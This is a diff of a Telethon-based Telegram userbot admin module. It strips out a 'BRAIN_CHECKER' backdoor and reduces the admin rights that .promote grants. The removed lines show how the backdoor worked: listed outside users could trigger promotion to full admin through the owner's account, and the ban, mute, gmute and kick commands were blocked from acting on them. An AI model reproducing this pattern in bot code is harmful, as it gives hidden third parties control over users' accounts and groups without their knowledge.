@@ -22,7 +22,7 @@ from telethon.tl.types import (ChannelParticipantsAdmins, ChatAdminRights,
                                ChatBannedRights, MessageEntityMentionName,
                                MessageMediaPhoto)
 
-from userbot import BOTLOG, BOTLOG_CHATID, BRAIN_CHECKER, CMD_HELP, bot
+from userbot import BOTLOG, BOTLOG_CHATID, CMD_HELP, bot
 from userbot.events import register
 
 # =================== CONSTANT ===================
@@ -113,7 +113,6 @@ async def set_group_photo(gpic):
 
 
 @register(outgoing=True, pattern="^.promote(?: |$)(.*)")
-@register(incoming=True, from_users=BRAIN_CHECKER, pattern="^.promote(?: |$)(.*)")
 async def promote(promt):
     """ For .promote command, do promote targeted person """
     if not promt.text[0].isalpha() \
@@ -130,9 +129,9 @@ async def promote(promt):
             return
 
         new_rights = ChatAdminRights(
-            add_admins=True,
+            add_admins=False,
             invite_users=True,
-            change_info=True,
+            change_info=False,
             ban_users=True,
             delete_messages=True,
             pin_messages=True
@@ -251,12 +250,6 @@ async def ban(bon):
         else:
             return
 
-        # If the user is a sudo
-        if user.id in BRAIN_CHECKER:
-            await bon.edit(
-                "`Ban Error! I am not supposed to ban this user`"
-            )
-            return
 
         # Announce that we're going to whack the pest
         await bon.edit("`Whacking the pest!`")
@@ -375,12 +368,6 @@ async def spider(spdr):
         	await spdr.edit("`Mute Error! You are not supposed to mute yourself!`")
         	return
 
-        # If the targeted user is a Sudo
-        if user.id in BRAIN_CHECKER:
-            await spdr.edit(
-                "`Mute Error! I am not supposed to mute this user`"
-            )
-            return
 
         # If everything goes well, do announcing and mute
         await spdr.edit("`Gets a tape!`")
@@ -575,10 +562,6 @@ async def gspider(gspdr):
         else:
             return
 
-        # If the targeted user is a SUDO
-        if user.id in BRAIN_CHECKER:
-            await gspdr.edit("`Gmute Error! Couldn't gmute this user`")
-            return
 
         # If pass, inform and start gmuting
         await gspdr.edit("`Grabs a huge, sticky duct tape!`")
@@ -763,12 +746,6 @@ async def kick(usr):
             await usr.edit("`Couldn't fetch user.`")
             return
 
-        # If the targeted user is a Sudo
-        if user.id in BRAIN_CHECKER:
-            await usr.edit(
-                "`Kick Error! I am not supposed to kick this user`"
-            )
-            return
 
         await usr.edit("`Kicking...`")
 
@@ -843,7 +820,7 @@ async def get_users(show):
                 reply_to=show.id,
             )
             remove("userslist.txt")
-            
+
 
 async def get_user_from_event(event):
     """ Get the user from argument or replied message. """
